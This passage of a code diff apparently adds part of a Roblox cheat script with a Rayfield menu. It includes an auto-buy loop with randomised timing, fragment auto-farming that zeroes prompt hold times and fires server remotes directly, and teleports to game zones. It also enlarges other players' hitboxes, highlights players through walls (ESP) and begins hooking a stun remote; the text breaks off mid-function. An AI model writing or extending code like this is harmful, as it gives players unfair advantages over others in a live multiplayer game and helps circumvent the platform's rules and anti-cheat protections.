+                    Content = string.format("Bought %d Lucky Blocks this session", _lbBuyStats.total),
+                    Duration = 5,
+                    Image   = 4483362458,
+                })
+            end
+        end
+    end,
+})
+end)()
+;(function()
+GearTab:CreateSection("Auto Buy")
+GearTab:CreateParagraph({
+    Title   = "Auto Buy — Night Farm Mode",
+    Content = "Buys the selected gear every ~2s forever.\n"
+           .. "✅ Continues buying after success\n"
+           .. "⏳ Out of Stock → retries in 2s\n"
+           .. "💰 No Coins → retries in 2s\n"
+           .. "💀 Respawn-safe · 🌙 Night Farm ready\n"
+           .. "Toggle OFF to stop.",
+})
+local _resetAutoBuyFlag do
+    _resetAutoBuyFlag = function()
+        pcall(function()
+            local flag = Rayfield.Flags and Rayfield.Flags["AutoBuyGear"]
+            if flag then flag:Set(false) end
+        end)
+    end
+end
+local _buyStatsPara = GearTab:CreateParagraph({
+    Title   = "📊 Auto Buy Stats",
+    Content = "Idle",
+})
+local _buyStats = { total=0, spent=0, attempts=0, startTick=0 }
+local function _updateStatsHUD()
+    if not auto.buyEnabled then return end
+    pcall(function()
+        local elapsed  = tick() - _buyStats.startTick
+        local mins     = math.floor(elapsed / 60)
+        local secs     = math.floor(elapsed % 60)
+        local data     = S.selectedGear and GEAR_REGISTRY[S.selectedGear]
+        local gearName = data and data.displayName or "—"
+        _buyStatsPara:Set({
+            Title   = "📊 Auto Buy — " .. gearName,
+            Content = string.format(
+                "✅ Bought: %d  •  💰 Spent: ~%d coins\n"
+             .. "🔄 Attempts: %d  •  ⏱ Running: %02d:%02d",
+                _buyStats.total, _buyStats.spent, _buyStats.attempts, mins, secs),
+        })
+    end)
+end
+local _lastNotifTime = {}
+local function _throttledNotify(rtype, title, content)
+    local now  = tick()
+    local last = _lastNotifTime[rtype] or 0
+    if now - last < 30 then return end
+    _lastNotifTime[rtype] = now
+    pcall(function()
+        Rayfield:Notify({ Title=title, Content=content, Duration=3, Image=4483362458 })
+    end)
+end
+local function _ensureRemote()
+    if _VP_REMOTE and _VP_REMOTE.Parent then return true end
+    local ok, found = pcall(function()
+        return ReplicatedStorage:WaitForChild("Events", 3):WaitForChild("VendorPurchase", 3)
+    end)
+    if ok and found then _VP_REMOTE = found return true end
+    return false
+end
+local function _waitForAliveCharacter(maxWait)
+    maxWait = maxWait or 10
+    local deadline = tick() + maxWait
+    while tick() < deadline do
+        local char = Players.LocalPlayer.Character
+        local hum  = char and char:FindFirstChildOfClass("Humanoid")
+        if hum and hum.Health > 0 then return true end
+        task.wait(0.5)
+    end
+    return false
+end
+local function _runBuyLoop()
+    while auto.buyEnabled do
+        _buyStats.attempts = _buyStats.attempts + 1
+        if not _ensureRemote() then
+            _throttledNotify("no_remote","⚠️ Remote Missing","VendorPurchase not found — waiting...")
+            task.wait(5) continue
+        end
+        if not _waitForAliveCharacter(10) then task.wait(2) continue end
+        local gearsToTry = {}
+        if S.selectedGears and #S.selectedGears > 0 then
+            gearsToTry = S.selectedGears
+        elseif S.selectedGear then
+            gearsToTry = { S.selectedGear }
+        end
+        if #gearsToTry == 0 then task.wait(2) continue end
+        for _, gearKey in ipairs(gearsToTry) do
+            if not auto.buyEnabled then break end
+            local currentData = GEAR_REGISTRY[gearKey]
+            if not currentData then continue end
+            local result
+            pcall(function() result = buyGear(gearKey) end)
+            result = result or BUY_RESULT.NOT_IN_SHOP
+            if result == BUY_RESULT.SUCCESS then
+                _buyStats.total = _buyStats.total + 1
+                _buyStats.spent = _buyStats.spent + (currentData.coinPrice or 0)
+                _throttledNotify("success","✅ Purchased!",
+                    currentData.displayName .. " — " .. _buyStats.total .. " bought this session")
+            elseif result == BUY_RESULT.OUT_OF_STOCK then
+                local secs    = _getVendorTimerSeconds()
+                local timeStr = secs and string.format(" (restock in %02d:%02d)", math.floor(secs/60), secs%60) or ""
+                _throttledNotify("oos","⏳ Out of Stock", currentData.displayName .. timeStr)
+                task.delay(3, function()
+                    if not auto.buyEnabled then return end
+                    local normDN = _normaliseKey(currentData.displayName)
+                    local normSK = _normaliseKey(currentData.serverKey)
+                    local toErase = {}
+                    for k, v in pairs(_stockData) do
+                        if v.manual and not v.inStock then
+                            local normK = _normaliseKey(k)
+                            if normK == normDN or normK == normSK
+                            or normK:find(normSK,1,true) or normSK:find(normK,1,true) then
+                                table.insert(toErase, k)
+                            end
+                        end
+                    end
+                    for _, k in ipairs(toErase) do _stockData[k] = nil end
+                end)
+            elseif result == BUY_RESULT.NO_COINS then
+                _throttledNotify("coins","💰 Not Enough Coins","Need " .. (currentData.coinPrice or 0) .. " coins for " .. currentData.displayName)
+            elseif result == BUY_RESULT.NOT_IN_SHOP then
+                _writeStock(currentData.displayName, true, 1, false)
+            end
+            task.wait(0.5)
+        end
+        _updateStatsHUD()
+        local jitter = (math.random(0, 600) / 1000) - 0.3
+        task.wait(2 + jitter)
+    end
+end
+GearTab:CreateToggle({
+    Name         = "Auto Buy",
+    CurrentValue = false,
+    Flag         = "AutoBuyGear",
+    Callback     = function(Value)
+        auto.buyEnabled = Value
+        if Value then
+            if #S.selectedGears == 0 and not S.selectedGear then
+                Rayfield:Notify({ Title="Auto Buy", Content="Select a gear from the list first!", Duration=3, Image=4483362458 })
+                auto.buyEnabled = false
+                _resetAutoBuyFlag()
+                return
+            end
+            if not S.selectedGear and #S.selectedGears > 0 then
+                S.selectedGear = S.selectedGears[1]
+            end
+            local data = GEAR_REGISTRY[S.selectedGear]
+            _buyStats = { total=0, spent=0, attempts=0, startTick=tick() }
+            _lastNotifTime = {}
+            Rayfield:Notify({
+                Title   = "🌙 Night Farm Active",
+                Content = "Auto buying: " .. data.displayName .. "\nRuns forever — toggle OFF to stop.",
+                Duration = 4,
+                Image   = 4483362458,
+            })
+            auto.buyThread = task.spawn(_runBuyLoop)
+            task.spawn(function()
+                task.wait(15)
+                while auto.buyEnabled do
+                    task.wait(10)
+                    if auto.buyEnabled and (auto.buyThread == nil or coroutine.status(auto.buyThread) == "dead") then
+                        Rayfield:Notify({ Title="⚠️ Auto Buy", Content="Thread recovered — restarting.", Duration=3, Image=4483362458 })
+                        auto.buyThread = task.spawn(_runBuyLoop)
+                    end
+                end
+            end)
+        else
+            if auto.buyThread then pcall(task.cancel, auto.buyThread) auto.buyThread = nil end
+            local data  = S.selectedGear and GEAR_REGISTRY[S.selectedGear]
+            local name  = data and data.displayName or "Gear"
+            pcall(function()
+                _buyStatsPara:Set({
+                    Title   = "📊 Auto Buy — Stopped",
+                    Content = string.format(
+                        "Session ended.\n✅ Bought: %d %s  •  💰 Spent: ~%d coins\n🔄 Total Attempts: %d",
+                        _buyStats.total, name, _buyStats.spent, _buyStats.attempts),
+                })
+            end)
+            Rayfield:Notify({
+                Title   = "Auto Buy Stopped",
+                Content = string.format("Bought %d × %s  •  ~%d coins spent", _buyStats.total, name, _buyStats.spent),
+                Duration = 5,
+                Image   = 4483362458,
+            })
+        end
+    end,
+})
+end)()
+local function getRequiredVolcanoBrainrot()
+    local vo = workspace:FindFirstChild("GameFolder") and workspace.GameFolder:FindFirstChild("VolcanoObby")
+    local dr = vo and vo:FindFirstChild("DinoRender")
+    if not dr then return nil, nil end
+    for _, v in pairs(dr:GetChildren()) do
+        if v:IsA("Model") then
+            local n = v:GetAttribute("Name")
+            local mut = v:GetAttribute("Mutation") or "Normal"
+            if n and n ~= "" then
+                return n, mut
+            end
+        end
+    end
+    return nil, nil
+end
+local function findVolcanoTarget(reqName, reqMut)
+    for _, rarity in ipairs(ALL_RARITIES) do
+        local folder = getBrainrotFolder(rarity)
+        if folder then
+            for _, obj in pairs(folder:GetChildren()) do
+                if obj and obj.Parent then
+                    local objNameAttr    = obj:GetAttribute("Name")        or ""
+                    local objDisplayName = obj:GetAttribute("DisplayName") or ""
+                    local objMut         = obj:GetAttribute("Mutation")    or "Normal"
+                    if (objNameAttr == reqName or objDisplayName == reqName) and objMut == reqMut then
+                        return obj
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+local function isVolcanoEventActive()
+    return true
+end
+local GREEN_LINE = Vector3.new(-31.773190, 4.259904, -56.313618)
+local function submitToVolcano()
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local vo = workspace:FindFirstChild("GameFolder") and workspace.GameFolder:FindFirstChild("VolcanoObby")
+    local dino = vo and vo:FindFirstChild("TralaleroDinosauro")
+    local rootPart = dino and dino:FindFirstChild("RootPart")
+    local att = rootPart and rootPart:FindFirstChild("UIAttachment")
+    local prompt = att and att:FindFirstChildWhichIsA("ProximityPrompt")
+    local tw1 = TweenService:Create(root,
+        TweenInfo.new(1.2, Enum.EasingStyle.Linear),
+        { CFrame = CFrame.new(GREEN_LINE) }
+    )
+    tw1:Play() tw1.Completed:Wait()
+    walkForward(5, 3)
+    if rootPart then
+        local tw2 = TweenService:Create(root,
+            TweenInfo.new(0.5, Enum.EasingStyle.Linear),
+            { CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 4, 0)) }
+        )
+        tw2:Play() tw2.Completed:Wait()
+    end
+    task.wait(0.5)
+    if prompt then
+        _fireprox(prompt)
+        task.wait(0.3)
+    end
+    local submitRemote = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
+    submitRemote = submitRemote and submitRemote:FindFirstChild("VolcanoObby")
+    submitRemote = submitRemote and submitRemote:FindFirstChild("SubmitBrainrot")
+    if submitRemote then
+        pcall(function() submitRemote:FireServer() end)
+    end
+    task.wait(0.5)
+end
+;(function()
+local function _findFragments()
+    local found, seen = {}, {}
+    local _charSet = {}
+    pcall(function()
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr.Character then _charSet[plr.Character] = true end
+        end
+    end)
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if not (obj and obj.Parent) then continue end
+        local n = obj.Name:lower()
+        if not (n:find("fragment") or n == "frag") then continue end
+        if not (obj:IsA("BasePart") or obj:IsA("Model")) then continue end
+        local oa = obj:GetAttribute("Owner") or obj:GetAttribute("Carrying")
+               or obj:GetAttribute("IsHeld") or obj:GetAttribute("HeldBy")
+        if oa and tostring(oa) ~= "" and tostring(oa) ~= "0" then continue end
+        local skip = false
+        local anc = obj.Parent
+        while anc and anc ~= workspace do
+            if seen[anc] then skip = true break end
+            if _charSet[anc] then skip = true break end
+            local an = anc.Name
+            if an == "Plots" or an == "Plot" or an == "PlayerPlot"
+            or an == "PlacedItems" or an == "Furniture" or an == "Chair"
+            or an == "FuseMachine" or an == "ForbiddenFuse" or an == "FuseSlot"
+            or an == "BrainrotSlot" or an == "Slot" or an == "InputSlot"
+            or an == "MachinePart" or an == "SubmitArea" or an == "FragmentSlot"
+            or an == "FragmentHolder" or an == "SubmitZone" or an == "Throne"
+            or an == "ThroneSlot" or an == "ForbiddenThrone" then
+                skip = true break
+            end
+            anc = anc.Parent
+        end
+        if not skip and not _isFragmentTaken(obj) then
+            seen[obj] = true
+            table.insert(found, obj)
+        end
+    end
+    return found
+end
+local function _grabFragmentObj(obj)
+    if not obj or not obj.Parent then return false end
+    if _isFragmentTaken(obj) then return false end
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    local part = (obj:IsA("BasePart") and obj)
+        or obj.PrimaryPart
+        or obj:FindFirstChildWhichIsA("BasePart")
+    if not part then return false end
+    safeTeleport(part.CFrame * CFrame.new(0, 4, 0))
+    task.wait(0.15)
+    root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    pcall(function() root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end)
+    task.wait(0.2)
+    local parts = obj:IsA("BasePart") and { obj } or obj:GetDescendants()
+    for _, p in ipairs(parts) do
+        if p:IsA("BasePart") then
+            _firetouchinterest(root, p, 0)
+            task.wait(0.05)
+        end
+    end
+    local allDesc = obj:IsA("Model") and obj:GetDescendants() or { obj }
+    for _, d in ipairs(allDesc) do
+        if d:IsA("ProximityPrompt") then
+            local prompt = d
+            local origHold = prompt.HoldDuration
+            pcall(function() prompt.HoldDuration = 0 end)
+            pcall(function() prompt.MaxActivationDistance = 999 end)
+            local fired = typeof(fireproximityprompt) == "function" and pcall(fireproximityprompt, prompt)
+            if not fired then fired = pcall(function()
+                game:GetService("ProximityPromptService"):PromptTriggered(prompt, player)
+            end) end
+            if not fired then pcall(function()
+                local ev = ReplicatedStorage:FindFirstChild("Events")
+                local interact = ev and (ev:FindFirstChild("Interact") or ev:FindFirstChild("ProximityPrompt")
+                    or ev:FindFirstChild("Trigger") or ev:FindFirstChild("PickUp") or ev:FindFirstChild("Collect"))
+                if interact then interact:FireServer(prompt) fired = true end
+            end) end
+            if not fired then
+                _firetouchinterest(root, part, 0)
+                task.wait(0.05)
+            end
+            task.wait(0.15)
+            pcall(function() prompt.HoldDuration = origHold end)
+            pcall(function() prompt.MaxActivationDistance = 10 end)
+            break
+        end
+    end
+    local deadline = tick() + 2
+    while obj.Parent and tick() < deadline do
+        task.wait(0.1)
+    end
+    if obj.Parent then return false end
+    pcall(function()
+        local pid = tostring(game.PlaceId)
+        local jid = tostring(game.JobId)
+        local serverLink = "https://www.roblox.com/games/start?placeId=" .. pid .. "&gameInstanceId=" .. jid .. "&startPlaceId=" .. pid
+        sendWebhook("🔷 Fragment Collected!", "Fragment grabbed!\n[Join Server](" .. serverLink .. ")", 0x3399FF)
+    end)
+    return true
+end
+ForbiddenTab:CreateParagraph({
+    Title   = "🚫 Forbidden Zone",
+    Content = "New underground zone.\nFuse 4 Brainrots → get Fragment → submit 10 to Throne → craft Forbidden La Everything Combinaziones.",
+})
+ForbiddenTab:CreateSection("Teleport")
+ForbiddenTab:CreateButton({
+    Name     = "🚫 Teleport to Forbidden Entry",
+    Callback = function()
+        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        if root then root.CFrame = CFrame.new(Vector3.new(4.677, 57.931, -3700.579)) end
+    end,
+})
+ForbiddenTab:CreateButton({
+    Name     = "🧬 Teleport to Fuse Machine",
+    Callback = function()
+        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+        local gf  = workspace:FindFirstChild("GameFolder")
+        local fuse = gf and gf:FindFirstChild("ForbiddenFuse")
+        if fuse then
+            local ok, cf = pcall(function() return fuse:GetModelCFrame() end)
+            if ok then root.CFrame = CFrame.new(cf.Position + Vector3.new(0, 4, 6)) return end
+        end
+        root.CFrame = CFrame.new(Vector3.new(-11.554, 34, -6342))
+    end,
+})
+ForbiddenTab:CreateSection("Auto Collect")
+ForbiddenTab:CreateToggle({
+    Name         = "Auto Farm Fragments",
+    CurrentValue = false,
+    Flag         = "AutoFragment",
+    Callback     = function(v)
+        S.autoFragmentEnabled = v
+        if S.autoFragmentConn then
+            S.autoFragmentConn:Disconnect()
+            S.autoFragmentConn = nil
+        end
+        if S.autoFragmentThread then
+            pcall(task.cancel, S.autoFragmentThread)
+            S.autoFragmentThread = nil
+        end
+        if not v then
+            if S._fragForcedInstantGrab then
+                S._fragForcedInstantGrab = false
+                S.instantGrabEnabled = false
+                if S.instantGrabConnection then
+                    S.instantGrabConnection:Disconnect()
+                    S.instantGrabConnection = nil
+                end
+                for prompt, originalTime in pairs(S.OriginalHoldTimes) do
+                    if prompt and prompt.Parent then prompt.HoldDuration = originalTime end
+                end
+                S.OriginalHoldTimes = {}
+                pcall(function()
+                    local flag = Rayfield.Flags and Rayfield.Flags["InstantGrab"]
+                    if flag then flag:Set(false) end
+                end)
+            end
+            Rayfield:Notify({ Title = "🔷 Fragments", Content = "Auto Farm OFF", Duration = 3, Image = 4483362458 })
+            return
+        end
+        hideLava()
+        if not S.instantGrabEnabled then
+            S._fragForcedInstantGrab = true
+            S.instantGrabEnabled = true
+            for _, obj in ipairs(workspace:GetDescendants()) do
+                if obj:IsA("ProximityPrompt") then
+                    if not S.OriginalHoldTimes[obj] then S.OriginalHoldTimes[obj] = obj.HoldDuration end
+                    obj.HoldDuration = 0
+                end
+            end
+            S.instantGrabConnection = workspace.DescendantAdded:Connect(function(obj)
+                if obj:IsA("ProximityPrompt") then
+                    task.wait()
+                    if not S.OriginalHoldTimes[obj] then S.OriginalHoldTimes[obj] = obj.HoldDuration end
+                    obj.HoldDuration = 0
+                end
+            end)
+            pcall(function()
+                local flag = Rayfield.Flags and Rayfield.Flags["InstantGrab"]
+                if flag then flag:Set(true) end
+            end)
+        else
+            S._fragForcedInstantGrab = false
+        end
+        Rayfield:Notify({ Title = "🔷 Auto Farm Fragments", Content = "Running — Remove Lava + Instant Grab active.", Duration = 4, Image = 4483362458 })
+        S.autoFragmentThread = task.spawn(function()
+            local _attemptedFrags = {}
+            while S.autoFragmentEnabled do
+                local char = player.Character
+                local root = char and char:FindFirstChild("HumanoidRootPart")
+                if not root then task.wait(0.5) continue end
+                for fObj in pairs(_attemptedFrags) do
+                    if not fObj.Parent then _attemptedFrags[fObj] = nil end
+                end
+                local frags = _findFragments()
+                local pendingFrags = {}
+                for _, f in ipairs(frags) do
+                    if not _attemptedFrags[f] then
+                        table.insert(pendingFrags, f)
+                    end
+                end
+                if #pendingFrags == 0 then task.wait(1) continue end
+                table.sort(pendingFrags, function(a, b)
+                    local function getPos(o)
+                        if o:IsA("BasePart") then return o.Position end
+                        local ok, cf = pcall(function() return o:GetModelCFrame() end)
+                        return ok and cf.Position or Vector3.zero
+                    end
+                    return (getPos(a) - root.Position).Magnitude < (getPos(b) - root.Position).Magnitude
+                end)
+                local grabbed = 0
+                for _, frag in ipairs(pendingFrags) do
+                    if not S.autoFragmentEnabled then break end
+                    if S.grabLock then break end
+                    _attemptedFrags[frag] = true
+                    local ok, did = pcall(_grabFragmentObj, frag)
+                    if ok and did then grabbed = grabbed + 1 end
+                end
+                if grabbed > 0 and S.autoFragmentEnabled then
+                    pcall(function()
+                        local rs = game:GetService("ReplicatedStorage")
+                        local remote = rs:FindFirstChild("SubmitFragment")
+                        if remote then remote:FireServer() end
+                    end)
+                    pcall(submitAndPlace)
+                    if not teleportToMyPlot() then
+                        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                        if root then pcall(function() root.CFrame = getSafeBase() end) end
+                    end
+                    task.wait(2.5)
+                end
+                task.wait(0.5)
+            end
+        end)
+        S.autoFragmentConn = workspace.DescendantAdded:Connect(function(obj)
+            if not S.autoFragmentEnabled then return end
+            local n = obj.Name:lower()
+            if not (n:find("fragment") or n == "frag") then return end
+            if not (obj:IsA("BasePart") or obj:IsA("Model")) then return end
+            task.spawn(function()
+                task.wait(0.3)
+                if not S.autoFragmentEnabled or not obj.Parent then return end
+                local ok, did = pcall(_grabFragmentObj, obj)
+                if ok and did and S.autoFragmentEnabled then
+                    pcall(function()
+                        local rs = game:GetService("ReplicatedStorage")
+                        local remote = rs:FindFirstChild("SubmitFragment")
+                        if remote then remote:FireServer() end
+                    end)
+                    pcall(submitAndPlace)
+                    if not teleportToMyPlot() then
+                        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                        if root then pcall(function() root.CFrame = getSafeBase() end) end
+                    end
+                end
+            end)
+        end)
+    end,
+})
+ForbiddenTab:CreateSection("Fragments")
+ForbiddenTab:CreateButton({
+    Name     = "🔷 Submit Fragment (x1)",
+    Callback = function()
+        local rs = game:GetService("ReplicatedStorage")
+        local remote = rs:FindFirstChild("SubmitFragment")
+        if not remote then
+            Rayfield:Notify({ Title = "❌ Submit Fragment", Content = "SubmitFragment remote not found.", Duration = 4, Image = 4483362458 })
+            return
+        end
+        local ok, err = pcall(function() remote:FireServer() end)
+        if ok then
+            Rayfield:Notify({ Title = "🔷 Fragment Submitted", Content = "Fired SubmitFragment!", Duration = 3, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "❌ Error", Content = tostring(err), Duration = 4, Image = 4483362458 })
+        end
+    end,
+})
+ForbiddenTab:CreateSection("Forbidden Fuse")
+ForbiddenTab:CreateButton({
+    Name     = "🧬 Open Forbidden Fuse UI",
+    Callback = function()
+        local gf   = workspace:FindFirstChild("GameFolder")
+        local fuse = gf and gf:FindFirstChild("ForbiddenFuse")
+        if not fuse then
+            Rayfield:Notify({ Title = "❌ ForbiddenFuse", Content = "ForbiddenFuse not found in workspace.", Duration = 4, Image = 4483362458 })
+            return
+        end
+        local btn = fuse:FindFirstChild("UIButton")
+        local prompt = btn and btn:FindFirstChildWhichIsA("ProximityPrompt", true)
+        if prompt then
+            pcall(function()
+                if typeof(fireproximityprompt) == "function" then
+                    fireproximityprompt(prompt)
+                end
+            end)
+            Rayfield:Notify({ Title = "🧬 ForbiddenFuse", Content = "Opened UI!", Duration = 3, Image = 4483362458 })
+        else
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.CFrame = CFrame.new(Vector3.new(-11.554, 34, -6342)) end
+            Rayfield:Notify({ Title = "🧬 ForbiddenFuse", Content = "Prompt not found, teleported to machine.", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+ForbiddenTab:CreateButton({
+    Name     = "📦 Collect Fuse Result",
+    Callback = function()
+        local gf     = workspace:FindFirstChild("GameFolder")
+        local fuse   = gf and gf:FindFirstChild("ForbiddenFuse")
+        local result = fuse and fuse:FindFirstChild("Result")
+        if not result then
+            Rayfield:Notify({ Title = "❌ Result", Content = "No result part found.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        local att    = result:FindFirstChild("CollectAttachment")
+        local prompt = att and att:FindFirstChildWhichIsA("ProximityPrompt")
+        if prompt then
+            pcall(function()
+                if typeof(fireproximityprompt) == "function" then
+                    fireproximityprompt(prompt)
+                end
+            end)
+            Rayfield:Notify({ Title = "📦 Collected!", Content = "Fired collect prompt.", Duration = 3, Image = 4483362458 })
+        else
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0))
+                if typeof(firetouchinterest) == "function" then
+                    pcall(function() firetouchinterest(root, result, 0) end)
+                    task.wait(0.05)
+                    pcall(function() firetouchinterest(root, result, 1) end)
+                end
+            end
+            Rayfield:Notify({ Title = "📦 Collect", Content = "Prompt not found, used touch.", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+end)()
+ZonesTab:CreateSection("Teleport to Zones")
+do
+local zones = {
+    { name = "Common Zone",    pos = Vector3.new(-5.604886,   6.981283,    -181.638321) },
+    { name = "Rare Zone",      pos = Vector3.new(3.469897,    21.468637,   -381.855286) },
+    { name = "Epic Zone",      pos = Vector3.new(1.057454,    19.648050,   -653.962280) },
+    { name = "Legendary Zone", pos = Vector3.new(34.306286,   29.472792,   -933.720398) },
+    { name = "Mythic Zone",    pos = Vector3.new(-4.003283,   41.508194,  -1372.488647) },
+    { name = "Secret Zone",    pos = Vector3.new(-41.617702,  77.059113,  -1857.829224) },
+    { name = "Celestial Zone", pos = Vector3.new(-44.376785, 170.028870,  -2253.302979) },
+    { name = "End Zone",       pos = Vector3.new(-16.794611, 444.921265,  -3505.147217) },
+    { name = "🚫 Forbidden Zone", pos = Vector3.new(4.677,    57.931,      -3700.579)   },
+}
+for _, zone in ipairs(zones) do
+    ZonesTab:CreateButton({
+        Name     = zone.name,
+        Callback = function()
+            local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.CFrame = CFrame.new(zone.pos) end
+        end,
+    })
+end
+end
+HitboxTab:CreateSection("Hitbox Settings")
+HitboxTab:CreateToggle({
+    Name         = "Hitbox On/Off",
+    CurrentValue = false,
+    Flag         = "HitboxToggle",
+    Callback     = function(Value)
+        S.hitboxEnabled = Value
+        if not Value then
+            for _, v in next, Players:GetPlayers() do
+                if v ~= player then
+                    pcall(function()
+                        local root = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
+                        if root then
+                            root.Size         = Vector3.new(2, 2, 1)
+                            root.Transparency = 1
+                            root.CanCollide   = false
+                        end
+                    end)
+                end
+            end
+        end
+    end,
+})
+HitboxTab:CreateSlider({
+    Name         = "Hitbox Size",
+    Range        = {5, 150},
+    Increment    = 5,
+    Suffix       = "Studs",
+    CurrentValue = 50,
+    Flag         = "HitboxSize",
+    Callback     = function(Value) S.hitboxSize = Value end,
+})
+HitboxTab:CreateSlider({
+    Name         = "Hitbox Transparency",
+    Range        = {0, 10},
+    Increment    = 1,
+    Suffix       = "/10",
+    CurrentValue = 7,
+    Flag         = "HitboxTransp",
+    Callback     = function(Value) S.hitboxTransp = Value / 10 end,
+})
+HitboxTab:CreateDropdown({
+    Name          = "Hitbox Color",
+    Options       = {"Really blue","Bright red","Lime green","Hot pink","Cyan","Really black","White"},
+    CurrentOption = {"Really blue"},
+    Flag          = "HitboxColor",
+    Callback      = function(Option) S.hitboxColor = BrickColor.new(type(Option)=="table" and Option[1] or Option) end,
+})
+ExtraTab:CreateSection("Visual Enhancements")
+ExtraTab:CreateToggle({
+    Name         = "FullBright",
+    CurrentValue = false,
+    Flag         = "FullBright",
+    Callback     = function(Value)
+        S.fullBrightEnabled = Value
+        if Value then
+            Lighting.Brightness     = 2
+            Lighting.ClockTime      = 14
+            Lighting.FogEnd         = 100000
+            Lighting.GlobalShadows  = false
+            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+        else
+            Lighting.Brightness     = origLight[1]
+            Lighting.ClockTime      = origLight[2]
+            Lighting.FogEnd         = origLight[3]
+            Lighting.GlobalShadows  = origLight[4]
+            Lighting.OutdoorAmbient = origLight[5]
+        end
+    end,
+})
+ExtraTab:CreateButton({
+    Name     = "Remove Fog",
+    Callback = function()
+        Lighting.FogEnd   = 100000
+        Lighting.FogStart = 0
+    end,
+})
+ExtraTab:CreateToggle({
+    Name         = "Infinite Zoom",
+    CurrentValue = false,
+    Flag         = "InfiniteZoom",
+    Callback     = function(Value)
+        S.infiniteZoomEnabled = Value
+        if Value then
+            player.CameraMaxZoomDistance = 99999
+            player.CameraMinZoomDistance = 0
+        else
+            player.CameraMaxZoomDistance = 128
+            player.CameraMinZoomDistance = 0.5
+        end
+    end,
+})
+ExtraTab:CreateSection("ESP Features")
+ExtraTab:CreateToggle({
+    Name         = "Player ESP",
+    CurrentValue = false,
+    Flag         = "PlayerESP",
+    Callback     = function(Value)
+        local function createESP(target)
+            if not target or not target:FindFirstChild("HumanoidRootPart") then return end
+            if target:FindFirstChild("PlayerESP") then return end
+            local h = Instance.new("Highlight")
+            h.Parent              = target
+            h.FillColor           = Color3.fromRGB(255, 0, 0)
+            h.OutlineColor        = Color3.fromRGB(255, 255, 255)
+            h.FillTransparency    = 0.5
+            h.OutlineTransparency = 0
+            h.Name                = "PlayerESP"
+        end
+        local function removeESP(target)
+            if target then
+                local esp = target:FindFirstChild("PlayerESP")
+                if esp then esp:Destroy() end
+            end
+        end
+        S.playerESPEnabled = Value
+        if Value then
+            for _, otherPlayer in pairs(Players:GetPlayers()) do
+                if otherPlayer ~= player and otherPlayer.Character then
+                    createESP(otherPlayer.Character)
+                end
+            end
+            S.espConnections.PlayerAdded = Players.PlayerAdded:Connect(function(newPlayer)
+                if S.playerESPEnabled then
+                    newPlayer.CharacterAdded:Connect(function(char)
+                        if S.playerESPEnabled then task.wait(0.5) createESP(char) end
+                    end)
+                end
+            end)
+            for _, otherPlayer in pairs(Players:GetPlayers()) do
+                if otherPlayer ~= player then
+                    S.espConnections[otherPlayer.UserId] = otherPlayer.CharacterAdded:Connect(function(char)
+                        if S.playerESPEnabled then task.wait(0.5) createESP(char) end
+                    end)
+                end
+            end
+        else
+            for _, otherPlayer in pairs(Players:GetPlayers()) do
+                if otherPlayer.Character then removeESP(otherPlayer.Character) end
+            end
+            for _, conn in pairs(S.espConnections) do
+                if conn then conn:Disconnect() end
+            end
+            S.espConnections = {}
+        end
+    end,
+})
+ExtraTab:CreateToggle({
+    Name         = "Celestial ESP",
+    CurrentValue = false,
+    Flag         = "CelestialESP",
+    Callback     = function(Value)
+        S.celestialESPEnabled = Value
+        if Value then
+            local function addCelestialESP()
+                pcall(function()
+                    local gf = workspace:FindFirstChild("GameFolder")
+                    if not gf then return end
+                    local br = gf:FindFirstChild("Brainrots")
+                    if not br then return end
+                    local cf = br:FindFirstChild("Celestial")
+                    if not cf then return end
+                    for _, obj in pairs(cf:GetChildren()) do
+                        if obj:IsA("Model") and not obj:FindFirstChild("CelestialESP") then
+                            local h = Instance.new("Highlight")
+                            h.Parent              = obj
+                            h.FillColor           = Color3.fromRGB(255, 255, 0)
+                            h.OutlineColor        = Color3.fromRGB(255, 255, 255)
+                            h.FillTransparency    = 0.3
+                            h.OutlineTransparency = 0
+                            h.Name                = "CelestialESP"
+                        end
+                    end
+                end)
+            end
+            addCelestialESP()
+            S.celestialESPConnection = task.spawn(function()
+                while S.celestialESPEnabled do
+                    task.wait(1)
+                    addCelestialESP()
+                end
+            end)
+        else
+            if S.celestialESPConnection then
+                S.celestialESPEnabled = false
+                S.celestialESPConnection = nil
+            end
+            pcall(function()
+                local gf = workspace:FindFirstChild("GameFolder")
+                if not gf then return end
+                local br = gf:FindFirstChild("Brainrots")
+                if not br then return end
+                local cf = br:FindFirstChild("Celestial")
+                if not cf then return end
+                for _, obj in pairs(cf:GetDescendants()) do
+                    if obj.Name == "CelestialESP" then obj:Destroy() end
+                end
+            end)
+        end
+    end,
+})
+ExtraTab:CreateSection("🦇 Anti-Bat Stun")
+ExtraTab:CreateToggle({
+    Name         = "🦇 Anti-Bat Stun",
+    CurrentValue = false,
+    Flag         = "AntiBatStun",
+    Callback     = function(val)
+        S.antiBatEnabled = val
+        local function applyAntiBat()
+            if S.batRemote and S.batRemote.Parent then
+            elseif ReplicatedStorage:FindFirstChild("Remotes") then
+                S.batRemote = ReplicatedStorage.Remotes:FindFirstChild("BatStun")
+            end
+            if not S.batRemote then return false end
+            if typeof(getconnections) == "function" then
+                pcall(function()
